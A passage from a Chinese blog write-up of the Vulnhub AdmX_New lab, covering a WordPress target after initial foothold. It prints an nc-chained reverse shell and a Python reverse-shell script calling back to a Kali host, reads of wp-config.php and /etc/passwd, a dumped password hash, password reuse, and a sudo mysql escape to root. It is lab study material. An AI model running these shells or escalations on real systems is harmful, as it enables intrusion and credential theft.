+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/www/html/wordpress/wp-config.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235525893.png" alt="image-20230830235525893"></p>
+<ul>
+<li>发现了数据库的账号密码：<code>admin/Wp_Admin#123</code>，登录一下：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uadmin -pWp_Admin#123</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>结果发现，没啥用，蚁剑反弹的 Shell 没有回显。</li>
+<li>查看一下靶机是否安装有 NC：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235543037.png" alt="image-20230830235543037"></p>
+<ul>
+<li>发现存在 NC，但是是不带 -e 的版本。用 NC 串联反弹一个 Shell 回来：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 Kali 上开启两个 nc 监听</span></span><br><span class="line">nc -lvvp 4444</span><br><span class="line">nc -lvvp 5555</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在蚁剑上输入如下命令</span></span><br><span class="line">nc 192.168.1.136 4444 | /bin/bash | nc 192.168.1.136 5555</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235555924.png" alt="image-20230830235555924"></p>
+<h1 id="Python-Shell-反弹"><a href="#Python-Shell-反弹" class="headerlink" title="Python Shell 反弹"></a>Python Shell 反弹</h1><ul>
+<li>反弹成功！但是也不能进行回显，改用 Python 反弹，编写脚本 1.py：</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="line">s.connect((<span class="string">&quot;192.168.1.136&quot;</span>,<span class="number">4444</span>));</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>);</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>);</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>);</span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235611950.png" alt="image-20230830235611950"></p>
+<ul>
+<li>反弹成功！并且可以进行交互，但是还是无法正常登陆 MySQL：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235620492.png" alt="image-20230830235620492"></p>
+<h1 id="Shell-升级"><a href="#Shell-升级" class="headerlink" title="Shell 升级"></a>Shell 升级</h1><ul>
+<li>此处需要升级一下 Shell：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看一下 Kali 与 靶机 的当前 Shell</span></span><br><span class="line">echo $0</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# echo $0</span><br><span class="line">/usr/bin/zsh</span><br><span class="line"></span><br><span class="line">www-data@wp:/var/www/html/wordpress$ echo $0</span><br><span class="line">echo $0</span><br><span class="line">/bin/bash</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发现两者 Shell 环境不一致</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>开启升级操作：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1. 修改 Kali Shell 环境为 bash</span></span><br><span class="line">chsh -s /bin/bash</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2. 修改后重启</span></span><br><span class="line">reboot</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">3. 再次连接到 Python Shell，此处过程略</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">4. 连接 Shell 后使用 Ctrl + Z 将 Shell 挂起</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">5. Shell 挂起后输入如下命令改变本地终端设置，禁用 <span class="built_in">echo</span>，关闭输入输出</span></span><br><span class="line">stty raw -echo </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">6. 使用 <span class="built_in">fg</span> 将刚才挂起的 Shell 调用到前台（此处 <span class="built_in">fg</span> 命令在终端是不显示的）</span></span><br><span class="line">fg</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">7. 使用 <span class="built_in">export</span> 设置靶机终端的 Shell 环境变量</span></span><br><span class="line">export SHELL=/bin/bash</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">8. 使用 <span class="built_in">export</span> 进行清屏设置</span></span><br><span class="line">export TERM=screen</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">9. 修改靶机终端大小</span></span><br><span class="line">stty rows 38 columns 126</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">10. 重启靶机终端</span></span><br><span class="line">reset</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>但是，这种方法不知道为什么，不能用，绝了。</li>
+</ul>
+<h1 id="数据库查找"><a href="#数据库查找" class="headerlink" title="数据库查找"></a>数据库查找</h1><ul>
+<li>但是的但是，经过我的多次尝试，在没回显的情况下，进入数据库在退出还是会有一定的回显：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235654720.png" alt="image-20230830235654720"></p>
+<ul>
+<li>意外之喜，经过多轮尝试，得到信息如下：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">show databases;</span></span><br><span class="line"></span><br><span class="line">Database</span><br><span class="line">information_schema</span><br><span class="line">wordpress</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">show tables;</span></span><br><span class="line"></span><br><span class="line">Tables_in_wordpress</span><br><span class="line">wp_commentmeta</span><br><span class="line">wp_comments</span><br><span class="line">wp_links</span><br><span class="line">wp_options</span><br><span class="line">wp_postmeta</span><br><span class="line">wp_posts</span><br><span class="line">wp_term_relationships</span><br><span class="line">wp_term_taxonomy</span><br><span class="line">wp_termmeta</span><br><span class="line">wp_terms</span><br><span class="line">wp_usermeta</span><br><span class="line">wp_users</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="keyword">select</span> * from wp_users;</span></span><br><span class="line">ID      user_login      user_pass       user_nicename   user_email      user_url        user_registered user_activation_key     user_status     display_name</span><br><span class="line">1       admin   $P$B1sw76mAze9nXcsYokmVjZ2y0zrTAR1      admin   admin@wordpress.org     http://192.168.159.145/wordpress        2021-05-11 07:30:47             0       admin</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>淦，没卵用，目前已知的密码就俩：adam14、Wp_Admin#123。</li>
+</ul>
+<h1 id="密码复用"><a href="#密码复用" class="headerlink" title="密码复用"></a>密码复用</h1><ul>
+<li>看看密码能不能复用了，查看一下当前靶机的所有用户：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line">......</span><br><span class="line">wpadmin:x:1001:1001::/home/wpadmin:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>那就用上面两个密码，切换一下用户：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su wpadmin</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235749048.png" alt="image-20230830235749048"></p>
+<ul>
+<li>结果还真是，查看之前没权限查看的文件：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat local.txt</span><br><span class="line">153495edec1b606c24947b1335998bd9</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>得到第一个 <code>flag：153495edec1b606c24947b1335998bd9</code>。</li>
+</ul>
+<h1 id="SUDO-提权"><a href="#SUDO-提权" class="headerlink" title="SUDO 提权"></a>SUDO 提权</h1><ul>
+<li>用于不是 root 账户，决定再次提权，之前 sudo 密码，现有了：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sudo -l</span></span><br><span class="line">Matching Defaults entries for wpadmin on wp:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User wpadmin may run the following commands on wp:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/mysql -u root -D wordpress -p</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>可以看到在不需要密码的情况下执行 <code>/usr/bin/mysql -u root -D wordpress -p</code> 命令获得的是 root 权限（但其实还是需要密码）。</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">输入如下命令，密码随便输</span></span><br><span class="line">sudo /usr/bin/mysql -u root -D wordpress -p</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在 MySQL 5.x 中增加了 system 命令（Linux），简单的符号是 !，从而使 MySQL 可以执行系统的命令，尝试一下：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system id; # uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>发现可以执行，那就直接切换 Shell：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">system /bin/bash;</span><br><span class="line">id # uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">cd /root</span><br><span class="line">ls # proof.txt snap</span><br><span class="line">cat proof.txt # 7efd721c8bfff2937c66235f2d0dbac1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>找到第二个 <code>flag：7efd721c8bfff2937c66235f2d0dbac1</code>。</li>
+</ul>
+<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ul>
+<li>目录扫描容易把 Web 服务扫崩。</li>
+<li>Shell 升级命令解析：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46622976/article/details/124446922">https://blog.csdn.net/weixin_46622976&#x2F;article&#x2F;details&#x2F;124446922</a></li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="Yongz丶">Yongz丶</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://y0n9zh.github.io/2023/08/15/Vulnhub_Kali/04.AdmX_New_20230815/">https://y0n9zh.github.io/2023/08/15/Vulnhub_Kali/04.AdmX_New_20230815/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://y0n9zh.github.io" target="_blank">Yongz丶</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Vulnhub/">Vulnhub</a></div><div class="post_share"><div class="social-share" data-image="/./img/page_img/page_img7.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/./img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/./img/wechat.jpg" alt="Wechat"/></a><div class="post-qr-code-desc">Wechat</div></li><li class="reward-item"><a href="/./img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/./img/alipay.jpg" alt="Alipay"/></a><div class="post-qr-code-desc">Alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/08/16/Vulnhub_Kali/05.Hard_Socnet2_20230816/" title="Hard_Socnet2"><img class="cover" src="/./img/page_img/page_img8.jpg" onerror="onerror=null;src='/img/default_cover2.png'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Hard_Socnet2</div></div></a></div><div class="next-post pull-right"><a href="/2023/08/14/Vulnhub_Kali/03.Chronos_20230814/" title="Chronos"><img class="cover" src="/./img/page_img/page_img6.jpg" onerror="onerror=null;src='/img/default_cover2.png'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Chronos</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/08/12/Vulnhub_Kali/01.Medium_Socnet_20230812/" title="Medium_Socnet"><img class="cover" src="/./img/page_img/page_img4.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-12</div><div class="title">Medium_Socnet</div></div></a></div><div><a href="/2023/08/13/Vulnhub_Kali/02.Easy_Cloudantivirus_20230813/" title="Easy_Cloudantivirus"><img class="cover" src="/./img/page_img/page_img5.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-13</div><div class="title">Easy_Cloudantivirus</div></div></a></div><div><a href="/2023/08/14/Vulnhub_Kali/03.Chronos_20230814/" title="Chronos"><img class="cover" src="/./img/page_img/page_img6.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-14</div><div class="title">Chronos</div></div></a></div><div><a href="/2023/08/16/Vulnhub_Kali/05.Hard_Socnet2_20230816/" title="Hard_Socnet2"><img class="cover" src="/./img/page_img/page_img8.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-16</div><div class="title">Hard_Socnet2</div></div></a></div><div><a href="/2023/08/17/Vulnhub_Kali/06.EvilBox_One_20230817/" title="EvilBox_One"><img class="cover" src="/./img/page_img/page_img9.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-17</div><div class="title">EvilBox_One</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/./img/avatar.png" onerror="this.onerror=null;this.src='/img/default_cover2.png'" alt="avatar"/></div><div class="author-info__name">Yongz丶</div><div class="author-info__description">人生在世，是不太需要他人建议的，亲身经历之后才会明白。</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Y0n9zh?tab=repositories" target="_blank" title="Github"><i class="fab fa-github" style="color: #000000;"></i></a><a class="social-icon" href="mailto:y0n9zh@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #000000;"></i></a><a class="social-icon" href="https://www.yuque.com/yongz" target="_blank" title="Yueque"><i class="fa-solid fa-paperclip" style="color: #000000;"></i></a><a class="social-icon" href="https://music.163.com/#/user/home?id=252561863" target="_blank" title="Music"><i class="fa-solid fa-record-vinyl" style="color: #000000;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">不定时分享一些内容，有想要看的可以找我交流哦~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4"><span class="toc-number">2.</span> <span class="toc-text">目录爆破</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BurpSuite-%E5%8C%B9%E9%85%8D%E6%9B%BF%E6%8D%A2"><span class="toc-number">3.</span> <span class="toc-text">BurpSuite 匹配替换</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A1%86%E6%9E%B6%E6%89%AB%E6%8F%8F"><span class="toc-number">4.</span> <span class="toc-text">框架扫描</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">5.</span> <span class="toc-text">暴力破解</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%92%E4%BB%B6%E4%BC%A0%E9%A9%AC"><span class="toc-number">6.</span> <span class="toc-text">插件传马</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSF-Shell-%E5%8F%8D%E5%BC%B9"><span class="toc-number">7.</span> <span class="toc-text">MSF Shell 反弹</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NC-Shell-%E5%8F%8D%E5%BC%B9"><span class="toc-number">8.</span> <span class="toc-text">NC Shell 反弹</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Python-Shell-%E5%8F%8D%E5%BC%B9"><span class="toc-number">9.</span> <span class="toc-text">Python Shell 反弹</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shell-%E5%8D%87%E7%BA%A7"><span class="toc-number">10.</span> <span class="toc-text">Shell 升级</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9F%A5%E6%89%BE"><span class="toc-number">11.</span> <span class="toc-text">数据库查找</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%A4%8D%E7%94%A8"><span class="toc-number">12.</span> <span class="toc-text">密码复用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SUDO-%E6%8F%90%E6%9D%83"><span class="toc-number">13.</span> <span class="toc-text">SUDO 提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">14.</span> <span class="toc-text">注意事项</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/08/17/Vulnhub_Kali/06.EvilBox_One_20230817/" title="EvilBox_One"><img src="/./img/page_img/page_img9.jpg" onerror="this.onerror=null;this.src='/img/default_cover2.png'" alt="EvilBox_One"/></a><div class="content"><a class="title" href="/2023/08/17/Vulnhub_Kali/06.EvilBox_One_20230817/" title="EvilBox_One">EvilBox_One</a><time datetime="2023-08-17T14:23:31.000Z" title="发表于 2023-08-17 22:23:31">2023-08-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/16/Vulnhub_Kali/05.Hard_Socnet2_20230816/" title="Hard_Socnet2"><img src="/./img/page_img/page_img8.jpg" onerror="this.onerror=null;this.src='/img/default_cover2.png'" alt="Hard_Socnet2"/></a><div class="content"><a class="title" href="/2023/08/16/Vulnhub_Kali/05.Hard_Socnet2_20230816/" title="Hard_Socnet2">Hard_Socnet2</a><time datetime="2023-08-16T13:25:31.000Z" title="发表于 2023-08-16 21:25:31">2023-08-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/15/Vulnhub_Kali/04.AdmX_New_20230815/" title="AdmX_New_20230815"><img src="/./img/page_img/page_img7.jpg" onerror="this.onerror=null;this.src='/img/default_cover2.png'" alt="AdmX_New_20230815"/></a><div class="content"><a class="title" href="/2023/08/15/Vulnhub_Kali/04.AdmX_New_20230815/" title="AdmX_New_20230815">AdmX_New_20230815</a><time datetime="2023-08-15T12:25:31.000Z" title="发表于 2023-08-15 20:25:31">2023-08-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/14/Vulnhub_Kali/03.Chronos_20230814/" title="Chronos"><img src="/./img/page_img/page_img6.jpg" onerror="this.onerror=null;this.src='/img/default_cover2.png'" alt="Chronos"/></a><div class="content"><a class="title" href="/2023/08/14/Vulnhub_Kali/03.Chronos_20230814/" title="Chronos">Chronos</a><time datetime="2023-08-14T11:20:01.000Z" title="发表于 2023-08-14 19:20:01">2023-08-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/13/Vulnhub_Kali/02.Easy_Cloudantivirus_20230813/" title="Easy_Cloudantivirus"><img src="/./img/page_img/page_img5.jpg" onerror="this.onerror=null;this.src='/img/default_cover2.png'" alt="Easy_Cloudantivirus"/></a><div class="content"><a class="title" href="/2023/08/13/Vulnhub_Kali/02.Easy_Cloudantivirus_20230813/" title="Easy_Cloudantivirus">Easy_Cloudantivirus</a><time datetime="2023-08-13T05:00:01.000Z" title="发表于 2023-08-13 13:00:01">2023-08-13</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/./img/page_img/page_img7.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 By Yongz丶</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Actions speak louder than words.</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
